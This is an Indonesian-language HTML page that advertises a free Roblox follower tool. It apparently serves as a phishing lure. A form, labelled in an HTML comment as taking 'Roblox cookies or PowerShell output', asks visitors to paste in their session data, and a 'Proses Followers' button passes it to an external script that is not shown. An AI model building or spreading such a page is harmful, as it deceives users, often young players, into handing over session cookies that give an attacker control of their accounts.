<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TOOLS FOLLOWERS ROBLOX</title>
    <!-- Tailwind CSS CDN untuk styling modern dan responsif -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style type="text/tailwindcss">
        @layer base {
            /* Menggunakan font Inter untuk tampilan yang lebih modern dan bersih */
            body {
                font-family: 'Inter', sans-serif;
            }
        }
    </style>
    <!-- Google Fonts untuk font Inter -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <!-- Font Awesome CDN untuk ikon -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <!-- File CSS kustom (opsional, jika ada styling tambahan di luar Tailwind) -->
    <link rel="stylesheet" href="style.css">
</head>
<body class="bg-gradient-to-br from-gray-950 to-purple-950 text-gray-100 min-h-screen flex items-center justify-center p-4">
    <div class="bg-gray-800 bg-opacity-90 backdrop-blur-sm p-8 md:p-10 rounded-xl shadow-2xl max-w-lg w-full transform hover:scale-105 transition-all duration-500 ease-in-out border border-purple-700">
        <h1 class="text-4xl md:text-5xl font-extrabold text-center text-purple-400 mb-8 tracking-tight drop-shadow-lg animate-pulse">
            TOOLS FOLLOWERS ROBLOX
        </h1>

        <!-- Bagian Video Tutorial -->
        <div class="mb-8 p-4 bg-gray-700 bg-opacity-70 rounded-lg border border-purple-600 shadow-lg">
            <h2 class="text-2xl font-bold text-center text-purple-300 mb-4">
                <i class="fab fa-youtube mr-2"></i> Video Tutorial
            </h2>
            <div class="relative w-full" style="padding-top: 56.25%;"> <!-- 16:9 Aspect Ratio -->
                <iframe class="absolute top-0 left-0 w-full h-full rounded-md shadow-xl"
                        src="https://www.youtube.com/embed/nDwl4V77A6s"
                        title="YouTube video player"
                        frameborder="0"
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                        allowfullscreen></iframe>
            </div>
        </div>
        <!-- Akhir Bagian Video Tutorial -->

        <form id="cookies-form" class="space-y-6">
            <!-- Input untuk Jumlah Followers -->
            <div>
                <label for="followers" class="block text-lg font-medium text-gray-200 mb-2">
                    MASUKAN JUMLAH FOLLOWERS:
                </label>
                <input type="number" id="followers" name="followers" min="1" value="1000"
                       class="w-full p-4 bg-gray-700 border border-purple-600 rounded-lg focus:ring-purple-500 focus:border-purple-500 text-white placeholder-gray-400 transition-all duration-300 shadow-md outline-none"
                       placeholder="Contoh: 1000, 5000, 10000">
            </div>

            <!-- Input untuk Cookies Roblox atau Power Shell Output -->
            <div>
                <label for="cookies" class="block text-lg font-medium text-gray-200 mb-2">
                    MASUKAN FILE ANDA:
                </label>
                <textarea id="cookies" name="cookies" rows="6"
                          class="w-full p-4 bg-gray-700 border border-purple-600 rounded-lg focus:ring-purple-500 focus:border-purple-500 text-white resize-none transition-all duration-300 shadow-md outline-none"
                          placeholder=""></textarea>
            </div>
            <button type="button" id="save-cookies"
                    class="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-6 rounded-lg transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-offset-2 focus:ring-offset-gray-800 shadow-lg uppercase tracking-wider">
                <i class="fas fa-magic mr-2"></i> Proses Followers
            </button>
        </form>

        <div id="status" class="mt-8 text-center text-lg font-semibold text-gray-300 p-4 bg-gray-700 bg-opacity-70 rounded-lg border border-purple-600 shadow-inner opacity-0 transition-opacity duration-500 ease-out" style="min-height: 50px;">
            <!-- Pesan status akan muncul di sini -->
            <p>Menunggu input...</p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
